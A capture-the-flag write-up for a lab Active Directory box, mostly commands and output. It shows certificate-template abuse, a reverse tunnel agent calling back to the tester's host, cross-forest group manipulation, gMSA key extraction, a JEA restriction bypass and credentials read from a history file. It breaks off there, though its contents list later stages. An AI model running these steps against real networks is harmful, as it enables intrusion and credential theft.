
<img src="Images/logo%20pingpong.png" width="211" alt="logo pingpong">
# Attack Chain

```
c.roberts (creds donnés)
    └─ ESC13 → cert TemporaryWinRM → WinRM dc1
        └─ Pivot Ligolo → 192.168.2.0/24
            └─ Owns IT → GenericAll gMSA Managers (cross-forest)
                └─ Flip Global → DomainLocal → Add c.roberts FSP
                    └─ Read GMSA blob → AES256 key Pong_gMSA$
                        └─ JEA "restricted" + cmd.exe bypass
                            └─ PSReadLine history → c.carlssen creds
                                └─ GenericWrite svc_sql → RBCD + S4U c.adam
                                    └─ MSSQL sysadmin → SigmaPotato → SYSTEM
                                        └─ DCSync pong.htb → R.Martinelli AES
                                            └─ ESC4 SmartcardAuthentication → ESC1
                                                └─ Cert Administrator + SID
                                                    └─ TGT Administrator → root
```
# Sommaire

- [Enum](#enum)
	- [Nmap ping.htb](#nmap-pinghtb)
	- [SMB](#smb)
	- [Bloodhound ping.htb](#bloodhound-pinghtb)
- [AD CS](#ad-cs)
	- [Vulnerable Certificate](#vulnerable-certificate)
	- [Authentication](#authentication)
	- [Shell as c.roberts](#shell-as-croberts)
	- [Setup Ligolo](#setup-ligolo)
- [Enum pong.htb](#enum-ponghtb)
	- [Nmap](#nmap)
	- [Bloodhound](#bloodhound)
- [Exploiting ACL](#exploiting-acl)
	- [Get SID of c.roberts](#get-sid-of-croberts)
	- [Tickets Assembly](#tickets-assembly)
	- [Add GenericAll on gMSA Managers](#add-genericall-on-gmsa-managers)
	- [Change group to Universal](#change-group-to-universal)
	- [Change group to Local](#change-group-to-local)
	- [Add C.Roberts in gMSA Managers](#add-croberts-in-gmsa-managers)
	- [Get New TGT](#get-new-tgt)
	- [Read gmsa pass](#read-gmsa-pass)
	- [Decrypt AES256 key](#derive-aes256-key)
- [JEA](#jea)
	- [JEA file discovery](#jea-file-discovery)
	- [Testing Names](#testing-names)
	- [Connect to JEA endpoint](#connect-to-jea-endpoint)
	- [List Command](#list-command)
	- [Read PS History](#read-ps-history)
	- [Shell as c.carlssen](#shell-as-ccarlssen)
- [Abuse Rights of c.carlssen](#abuse-rights-of-ccarlssen)
	- [Add RBCD](#add-rbcd)
	- [S4u c.adam](#s4u-cadam)
- [MSSQL](#mssql)
	- [sysadmin validation](#sysadmin-validation)
	- [Exploit SeImpersonatePrivilege](#exploit-seimpersonateprivilege)
	- [Dump SAM](#dump-sam)
- [Privilege Escalation on DC1](#privilege-escalation-on-dc1)
	- [Enum Certificates Templates](#enum-certificates-templates)
	- [Convert ESC4 to ESC1](#convert-esc4-to-esc1)
	- [Request Certificate for Administrator](#request-certificate-for-administrator)
	- [Request TGT with Certificate](#request-tgt-with-certificate)
	- [Bonus DCSync on dc1.ping.htb](#bonus-dcsync-on-dc1pinghtb)
- [What Blocked Us](#what-blocked-us)
	- [Shadow Credentials on svc_sql (blocked by broken LDAPS)](#shadow-credentials-on-svc_sql-blocked-by-broken-ldaps)
	- [BloodyAD direct on dc2 (cross-realm Kerberos issues)](#bloodyad-direct-on-dc2-cross-realm-kerberos-issues)
	- [Certipy req without `-sid` (CVE-2022-26923 mitigation)](#certipy-req-without--sid-cve-2022-26923-mitigation)
	- [Certipy without `-dc-host dc2.pong.htb` (RPC cross-realm bug)](#certipy-without--dc-host-dc2ponghtb-rpc-cross-realm-bug)
- [Lessons Learned](#lessons-learned)

---

As is common in real life pentests, you will start the PingPong box with credentials for the following account c.roberts / AssumedBreach123
# Enum

### Nmap ping.htb

```
nmap -sVC 10.129.24.206 -oA scan                               Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-26 10:47 CEST
Nmap scan report for 10.129.24.206
Host is up (0.14s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-26 16:47:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ping.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ping.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ping.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ping.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
|_ssl-date: TLS randomness does not represent time
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m57s
| smb2-time:
|   date: 2026-04-26T16:48:15
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.92 seconds
```

We notice that the target is an AD, let's add it's FQDN and the domain to our `/etc/hosts` file.

```
echo "$TARGET_IP dc1.ping.htb ping.htb" | tee -a /etc/hosts
```
### SMB

NTLM is disabled so we must authenticate with kerberos

```
nxc smb 10.129.245.56 -u "c.roberts" -p "AssumedBreach123" -k --shares
SMB         10.129.245.56   445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.245.56   445    dc1              [+] ping.htb\c.roberts:AssumedBreach123
SMB         10.129.245.56   445    dc1              [*] Enumerated shares
SMB         10.129.245.56   445    dc1              Share           Permissions     Remark
SMB         10.129.245.56   445    dc1              -----           -----------     ------
SMB         10.129.245.56   445    dc1              ADMIN$                          Remote Admin
SMB         10.129.245.56   445    dc1              C$                              Default share
SMB         10.129.245.56   445    dc1              IPC$            READ            Remote IPC
SMB         10.129.245.56   445    dc1              NETLOGON        READ            Logon server share
SMB         10.129.245.56   445    dc1              SYSVOL          READ            Logon server share
```

Nothing interesting.

### Bloodhound ping.htb

Bloodhound.py doesn't work so we must request a tgt for our user and use `rusthound`.

```
getTGT.py 'ping.htb/c.roberts:AssumedBreach123' -dc-ip 10.129.245.56

Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in c.roberts.ccache
```

Now we need to modify our  `/etc/krb5` file so we can resolve the KDC of the target.

```
[libdefaults]
    default_realm = PING.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    PING.HTB = {
        kdc = dc1.ping.htb
        admin_server = dc1.ping.htb
    }

[domain_realm]
    .ping.htb = PING.HTB
    ping.htb = PING.HTB
```

We can now start scanning.

```
rusthound -d ping.htb -u 'c.roberts' -p 'AssumedBreach123' -f "dc1.ping.htb" -i 10.129.245.56 -k --ldaps --zip -o /workspace/bh/
---------------------------------------------------
Initializing RustHound at 19:32:04 on 04/26/26
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2026-04-26T17:32:04Z INFO  rusthound] Verbosity level: Info
[2026-04-26T17:32:05Z INFO  rusthound::ldap] Connected to PING.HTB Active Directory!
[2026-04-26T17:32:05Z INFO  rusthound::ldap] Starting data collection...
[2026-04-26T17:32:06Z INFO  rusthound::ldap] All data collected for NamingContext DC=ping,DC=htb
[2026-04-26T17:32:06Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2026-04-26T17:32:06Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2026-04-26T17:32:06Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2026-04-26T17:32:06Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2026-04-26T17:32:06Z INFO  rusthound::json::maker] 28 users parsed!
[2026-04-26T17:32:06Z INFO  rusthound::json::maker] 65 groups parsed!
[2026-04-26T17:32:06Z INFO  rusthound::json::maker] 1 computers parsed!
[2026-04-26T17:32:06Z INFO  rusthound::json::maker] 1 ous parsed!
[2026-04-26T17:32:06Z INFO  rusthound::json::maker] 1 domains parsed!
[2026-04-26T17:32:06Z INFO  rusthound::json::maker] 3 gpos parsed!
[2026-04-26T17:32:06Z INFO  rusthound::json::maker] 21 containers parsed!
[2026-04-26T17:32:06Z INFO  rusthound::json::maker] /workspace/bh//20260426193206_ping-htb_rusthound.zip created!

RustHound Enumeration Completed at 19:32:06 on 04/26/26! Happy Graphing!
```

Let's import the collected data to `bloodhound` now and look for attack vectors.

![Group Membership c.roberts](Images/Group%20Membership%20c.roberts.png)

We notice that we are member of `CERTIFICATE SERVICE DCOM ACCESS` which is linked to certificate enrollment.

# AD CS

Knowing our group membership, we can search for vulnerable certificates.
### Vulnerable Certificate

```
certipy find -u 'c.roberts@ping.htb' -k -no-pass -target dc1.ping.htb -dc-ip 10.129.245.56 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 20 issuance policies
[*] Found 1 OID linked to a template
[*] Retrieving CA configuration for 'ping-DC1-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'ping-DC1-CA'
[*] Checking web enrollment for CA 'ping-DC1-CA' @ 'dc1.ping.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : ping-DC1-CA
    DNS Name                            : dc1.ping.htb
    Certificate Subject                 : CN=ping-DC1-CA, DC=ping, DC=htb
    Certificate Serial Number           : 6F8E726EEFA64B894CE82D498BC27632
    Certificate Validity Start          : 2026-04-20 18:54:41+00:00
    Certificate Validity End            : 2126-04-20 19:04:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : PING.HTB\Administrators
      Access Rights
        ManageCa                        : PING.HTB\Administrators
                                          PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        ManageCertificates              : PING.HTB\Administrators
                                          PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Enroll                          : PING.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : TemporaryWinRM
    Display Name                        : Temporary WinRM
    Certificate Authorities             : ping-DC1-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-12-23T17:19:28+00:00
    Template Last Modified              : 2025-12-27T21:12:15+00:00
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.5808481.4086498.12600997.2067446.8927163.214.489503.1996623
    Linked Groups                       : CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : PING.HTB\Administrator
        Full Control Principals         : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Owner Principals          : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Dacl Principals           : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Property Enroll           : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
    [+] User Enrollable Principals      : PING.HTB\Domain Users
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb'.
```

The  `TemporaryWinRM` template has a **issuance policy OID link to the group `TempWinRMAccess`**. When we authenticate with the certificate, Kerberos adds our user to this group, which grants us WinRM access without us being an explicit member.

Let's request the certificate

```
certipy req -u 'c.roberts@ping.htb' -k -no-pass -target dc1.ping.htb -dc-ip 10.129.25.149 -ca 'ping-DC1-CA' -template 'TemporaryWinRM'
```

### Authentication

Once we authenticate we will be added to the group that allow our user to connect with winrm.
Let's authenticate our user with the certificate we obtained.

```
certipy auth -pfx c.roberts.pfx -domain ping.htb -dc-ip 10.129.245.56
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'C.Roberts@ping.htb'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Using principal: 'c.roberts@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'c.roberts.ccache'
File 'c.roberts.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'c.roberts.ccache'
[*] Trying to retrieve NT hash for 'c.roberts'
[*] Got hash for 'c.roberts@ping.htb': aad3b435b51404eeaad3b435b51404ee:2475be69d40e815588a85fd89c7a439d
```

We export the new `.ccache`.

```
export KRB5CCNAME=c.roberts.ccache
```

### Shell as c.roberts

Let's try to connect with winrm

```
evil-winrm -i dc1.ping.htb -r PING.HTB

*Evil-WinRM* PS C:\Users\C.Roberts\Documents>
```

It worked. From bloodhound we know that there are 2 domains, `ping.htb` and `pong.htb`. Let's look for sub network inside the target.

```
*Evil-WinRM* PS C:\Users\C.Roberts\Documents> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.2.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 0.0.0.0

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.245.56
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
```

We see that there is indeed one, let's see which IP belongs to `pong.htb`.

```
nslookup pong.htb
nslookup.exe : Non-authoritative answer:
    + CategoryInfo          : NotSpecified: (Non-authoritative answer::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Server:  localhost
Address:  127.0.0.1

Name:    pong.htb
Address:  192.168.2.2
```

We got the IP that host `pong.htb` realm. We can look at it's relation with ping by issuing the following command.

```
nltest /domain_trusts
List of domain trusts:
    0: pong pong.htb (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )
    1: PING ping.htb (NT 5) (Forest Tree Root) (Primary Domain) (Native)
The command completed successfully
```

`Direct Outbound + Direct Inbound` + `foresttrans` = **Bidirectional Forest Trust**. We can authenticate in `pong.htb` with the creds from `ping.htb` and vice versa.

### Setup Ligolo

To access the internal network we will use `ligolo-ng`.

First we add the tunnel to our machine.

```
ip tuntap add user root mode tun ligolo
ip link set ligolo up
```

We launch `ligolo`.

```
./proxy -selfcert
```

And we start the agent on the target which we transferred with `evil-winrm`.

**winrm**
```
.\agent.exe -connect 10.10.14.97:11601 -ignore-cert
```

Once we get the connection back, we select the right session on ligolo, we start it, and we add the route to access `pong.htb`.

```
ip route add 192.168.2.0/24 dev ligolo
```

# Enum pong.htb

### Nmap

We can start with a `nmap` scan to see which services are available on the target.

```
nmap -sTVC -Pn -oN pong_scan.txt 192.168.2.2
Nmap scan report for 192.168.2.2
Host is up (0.22s latency).
Not shown: 991 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-26 19:28:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RC0+
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2026-04-26T19:29:35+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-26T17:23:12
|_Not valid after:  2056-04-26T17:23:12
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: pong.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC2; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
|_nbstat: NetBIOS name: DC2, NetBIOS user: <unknown>, NetBIOS MAC: 00155d168602 (Microsoft)
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-04-26T19:28:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 26 13:29:35 2026 -- 1 IP address (1 host up) scanned in 114.03 seconds
```

From the mssql service running on `pong.htb` we can assume that it's the database server of the realm.
Let's add the FQDN and the domain to our `/etc/hosts` file.

```
echo "192.168.2.2 dc2.pong.htb pong.htb" | tee -a /etc/hosts
```

And add the following inside `/etc/krb5`

```
[realms]
    PONG.HTB = {
        kdc = dc2.pong.htb
        admin_server = dc2.pong.htb
    }

[domain_realm]
	    .pong.htb = PONG.HTB
	    pong.htb = PONG.HTB
```

### Bloodhound 

Let's collect data with rusthound to see potentials vulnerabilities.

```
rusthound -d pong.htb -u 'c.roberts' -p 'AssumedBreach123' -f "dc2.pong.htb" -i 192.168.2.2 -k --zip -o /workspace/bh/

---------------------------------------------------
Initializing RustHound at 17:28:34 on 04/27/26
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2026-04-27T15:28:34Z INFO  rusthound] Verbosity level: Info
[2026-04-27T15:28:34Z INFO  rusthound::ldap] Connected to PONG.HTB Active Directory!
[2026-04-27T15:28:34Z INFO  rusthound::ldap] Starting data collection...
[2026-04-27T15:28:35Z INFO  rusthound::ldap] All data collected for NamingContext DC=pong,DC=htb
[2026-04-27T15:28:35Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2026-04-27T15:28:35Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2026-04-27T15:28:35Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2026-04-27T15:28:35Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2026-04-27T15:28:35Z INFO  rusthound::json::maker] 19 users parsed!
[2026-04-27T15:28:35Z INFO  rusthound::json::maker] 64 groups parsed!
[2026-04-27T15:28:35Z INFO  rusthound::json::maker] 1 computers parsed!
[2026-04-27T15:28:35Z INFO  rusthound::json::maker] 2 ous parsed!
[2026-04-27T15:28:35Z INFO  rusthound::json::maker] 1 domains parsed!
[2026-04-27T15:28:35Z INFO  rusthound::json::maker] 3 gpos parsed!
[2026-04-27T15:28:35Z INFO  rusthound::json::maker] 21 containers parsed!
[2026-04-27T15:28:35Z INFO  rusthound::json::maker] /workspace/bh//20260427172835_pong-htb_rusthound.zip created!

RustHound Enumeration Completed at 17:28:35 on 04/27/26! Happy Graphing!
```


![Owns rights on GMSA MANAGERS](Images/Owns%20rights%20on%20GMSA%20MANAGERS.png)



![Read Password GMSA$](Images/Read%20Password%20GMSA%24.png)

Our user is a member of the `IT` group, which owns the `GMSA MANAGERS` group. That group has read rights on the GMSA password of the gmsa account in `pong.htb`.

# Exploiting ACL

Since Global groups can only contains members of the same domain, we need to flip the group to Universal or DomainLocal so it accepts cross-forest members.

### Get SID of c.roberts 

First we need the SID of `c.roberts`.

```
 bloodyAD --host "dc1.ping.htb" -d "ping.htb" \
  -u "c.roberts" -k --dc-ip 10.129.245.56 \
  get object "c.roberts" --attr objectSid

distinguishedName: CN=C.Roberts,CN=Users,DC=ping,DC=htb
objectSid: S-1-5-21-750635624-2058721901-1932338391-2617
```

### Tickets Assembly

To get rights on ping AND pong, we need to compile Kerberos tickets.

```
getTGT.py 'ping.htb/c.roberts:AssumedBreach123' -dc-ip 10.129.245.56
```

```
export KRB5CCNAME=$(pwd)/c.roberts.ccache
```

We request a cross-realm referral ticket from `ping.htb` to `pong.htb`

```
getST.py -k -no-pass -spn 'krbtgt/pong.htb' -dc-ip 10.129.*.* 'ping.htb/c.roberts'
```

```
export KRB5CCNAME=$(pwd)/c.roberts@krbtgt_PONG.HTB@PING.HTB.ccache
```

```
getST.py -k -no-pass -spn 'ldap/dc2.pong.htb' -dc-ip 192.168.2.2 'pong.htb/c.roberts'
```

We can compile both now using `python3`.

```
python3 -c "
from impacket.krb5.ccache import CCache
tgt = CCache.loadFile('c.roberts.ccache')
st = CCache.loadFile('c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache')
for cred in st.credentials:
    tgt.credentials.append(cred)
tgt.saveFile('combined.ccache')
print('[+] Done')
"
```

```
export KRB5CCNAME=$(pwd)/combined.ccache
klist

Ticket cache: FILE:combined.ccache
Default principal: c.roberts@PING.HTB

Valid starting       Expires              Service principal
04/27/2026 19:55:59  04/28/2026 05:55:59  krbtgt/PING.HTB@PING.HTB
        renew until 04/28/2026 19:55:59
04/27/2026 19:56:07  04/28/2026 05:55:59  HTTP/dc1.ping.htb@PING.HTB
        renew until 04/28/2026 19:55:59
04/27/2026 19:57:01  04/28/2026 05:55:59  ldap/dc2.pong.htb@PONG.HTB
        renew until 04/28/2026 19:55:59
```

We should have enough rights now.

### Add GenericAll on gMSA Managers

To modify the `GMSA Managers` group, we need to grant `GenericAll` to `c.roberts` on the group so we have every rights on it.

```
bloodyAD --host "dc2.pong.htb" -d "pong.htb" -u "c.roberts" -k --dc-ip 192.168.2.2 add genericAll 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' 'S-1-5-21-750635624-2058721901-1932338391-2617'

[+] S-1-5-21-750635624-2058721901-1932338391-2617 has now GenericAll on CN=gMSA Managers,CN=Users,DC=pong,DC=htb
```

### Change group to Universal

We can now flip the group.
We need to set the group to Universal since we can't set it directly to Local Domain.

```
bloodyAD --host "dc2.pong.htb" -d "pong.htb" \
  -u "c.roberts" -k --dc-ip 192.168.2.2 \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' \
  groupType -v "-2147483640"
  
[+] CN=gMSA Managers,CN=Users,DC=pong,DC=htb's groupType has been updated
```

### Change group to Local

Now that the group has been flipped to universal, we can flip it to Local.

```
bloodyAD --host "dc2.pong.htb" -d "pong.htb" \
  -u "c.roberts" -k --dc-ip 192.168.2.2 \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' \
  groupType -v "-2147483644"
  
[+] CN=gMSA Managers,CN=Users,DC=pong,DC=htb's groupType has been updated
```

### Add C.Roberts in gMSA Managers

The group has been updated and can now receive members of `ping.htb`, let's add our user to it.

```
bloodyAD --host "dc2.pong.htb" -d "pong.htb" \
  -u "c.roberts" -k --dc-ip 192.168.2.2 \
  add groupMember \
  'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' \
  'S-1-5-21-750635624-2058721901-1932338391-2617'
  
[+] S-1-5-21-750635624-2058721901-1932338391-2617 added to CN=gMSA Managers,CN=Users,DC=pong,DC=htb
```

### Get New TGT

To read the gmsa password, we need a fresh TGT.

```
getTGT.py 'ping.htb/c.roberts:AssumedBreach123' -dc-ip 10.129.245.56
export KRB5CCNAME=c.roberts.ccache
```

### Read gmsa pass

We can use the following command to retrieve the password and its hash.

```
nxc smb 10.129.*.* -u 'c.roberts' -k --gmsa
```

And we will discover the user `Pong_gMSA$`
But since NTLM is disabled, we can't use it's hash. So we must decrypt the AES256 key of the password of `Pong_gMSA$` to request a valid TGT.

To do that we first need to retrieve the blob

```
ldapsearch -H ldap://dc2.pong.htb -Y GSSAPI -b "CN=Pong_gMSA,CN=Managed Service Accounts,DC=pong,DC=htb" "(objectClass=*)" msDS-ManagedPassword -o ldif-wrap=no 2>/dev/null | grep -i msDS

# requesting: msDS-ManagedPassword
msDS-ManagedPassword:: AQAAACQCAAAQABI<BLOB>
```

### Derive AES256 key

Now that we got the BLOB, we can derive the AES256 Kerberos key from the password.

To do so, we can use that python script.

https://github.com/seriotonctf/gmsa-aes-keys

```
python3 gmsa_aes_keys.py "$BLOB" -s "Pong_gMSA$" -d pong.htb
sAMAccountName : Pong_gMSA$
salt           : PONG.HTBhostpong_gmsa.pong.htb
NT hash        : 4de3abd20486c8c953eb589de43f0205
AES128 key     : c48ae0b9895ebd9e1fe44ce34d3b696e
AES256 key     : 9a3d021763ac0f2ceb3b629eddf92fee758a3ba6fce28269a2d35a3e252e539a
```

Now we can retrieve a TGT for `Pong_gMSA$`

```
 getTGT.py 'pong.htb/Pong_gMSA$' \
  -aesKey 9a3d021763ac0f2ceb3b629eddf92fee758a3ba6fce28269a2d35a3e252e539a \
  -dc-ip 192.168.2.2
```

# JEA

### JEA file discovery

From the `c.roberts` session on `evil-winrm` we notice that there is a JEA file.

```
download "C:/ProgramData/JEA/JEA.pssc"
```

```
@{

# Version number of the schema used for this document
SchemaVersion = '2.0.0.0'

# ID used to uniquely identify this document
GUID = 'e26939b6-819a-496e-be9a-dfb45427c765'

# ConfigurationName = 'restricted'

# Author of this document
Author = 'Administrator'

# Session type defaults to apply for this session configuration. Can be 'RestrictedRemoteServer' (recommended), 'Empty', or 'Default'
SessionType = 'RestrictedRemoteServer'
LanguageMode = 'ConstrainedLanguage'
}
```

JEA stands for **"Just Enough Administration"**, a session type commonly used for service accounts to grant them just what they need to perform their actions.

The recovered file confirms that there is a restricted session available, but we don't know the name yet so we can't connect to it.

### Testing Names

We can use a custom brute force script to retrieve the right name of the JEA session available.

```
python3 << 'EOF'
import os
os.environ['KRB5CCNAME'] = '/workspace/Pong_gMSA$.ccache'

from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

# Tester plusieurs noms
configs = ['Microsoft.PowerShell', 'Microsoft.PowerShell32', 'restricted',
           'JEA_DC1', 'JEAEndpoint', 'JEAConfig', 'PingPong',
           'AdminEndpoint', 'jea', 'JEA_Restricted']

wsman = WSMan("dc1.ping.htb", auth="kerberos", cert_validation=False, ssl=False)

for cfg in configs:
    try:
        with RunspacePool(wsman, configuration_name=cfg) as pool:
            ps = PowerShell(pool)
            ps.add_script("$PSSenderInfo.ConnectionString")
            out = ps.invoke()
            print(f"[+] {cfg}: WORKS")
            break
    except Exception as e:
        msg = str(e)[:80]
        print(f"[-] {cfg}: {msg}")
EOF
[-] Microsoft.PowerShell: Received a WSManFault message. (Code: 5, Machine: dc1.ping.htb, Reason: Access i
[-] Microsoft.PowerShell32: Received a WSManFault message. (Code: 5, Machine: dc1.ping.htb, Reason: Access i
[+] restricted: WORKS
```

The name **"restricted"** appears to be valid.

### Connect to JEA endpoint

To connect to the endpoint, we can use that script.

**jea.py**
```
import os
os.environ['KRB5CCNAME'] = '/workspace/Pong_gMSA$.ccache'

from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan("dc1.ping.htb", auth="kerberos", cert_validation=False, ssl=False)

with RunspacePool(wsman, configuration_name="restricted") as pool:
    print("[+] Connected to JEA endpoint 'restricted' on dc1.ping.htb")
    print("[+] Type 'exit' to quit\n")
    while True:
        try:
            cmd = input("JEA> ")
            if cmd.lower() in ("exit", "quit"):
                break
            if not cmd.strip():
                continue
            ps = PowerShell(pool)
            ps.add_script(cmd)
            output = ps.invoke()
            for line in output:
                print(line)
            for err in ps.streams.error:
                print(f"[!] {err}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[!] {e}")
```

```
python3 jea.py
[+] Connected to JEA endpoint 'restricted' on dc1.ping.htb
[+] Type 'exit' to quit

JEA>
```

We are connected to the endpoint.

### List Command

Now we can list what commands are available to us.

```
JEA> Get-Command
Clear-Host
Exit-PSSession
Get-Command
Get-FormatData
Get-Help
Measure-Object
Out-Default
Select-Object
```

We can't do much with that so let's look for bypass.

### Read PS History

After some research the following payload works and allows us to read the PowerShell History file.

```
JEA> & { cmd.exe /c "type C:\Users\Pong_gMSA$\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" }

<SNIP>

System.management.automation.pscredential("pong\c.carlssen,$(convertto-securestring -asplaintext -force "A()DUJ!@414"))
